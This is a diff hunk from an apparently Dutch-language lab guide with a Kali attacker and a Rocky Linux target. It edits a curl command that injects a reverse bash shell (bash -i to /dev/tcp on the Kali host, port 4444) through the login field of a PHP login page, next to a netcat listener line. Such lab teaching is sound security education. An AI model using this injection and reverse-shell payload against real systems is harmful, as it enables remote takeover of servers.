@@ -90,7 +90,7 @@ nc -lvnp 4444
 - Surf naar de website van de *Rocky Linux* en stuur alle output naar onze listener op *Kali*
 
 ```bash
-curl -d "login=admin\" ; bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1 ; #" http://$IP_ROCKY$/login/index.php
+curl --data-urlencode "login=admin\" ; bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1 ; #" http://$IP_ROCKY$/login/index.php
 ```
 
 **Merk op dat**:
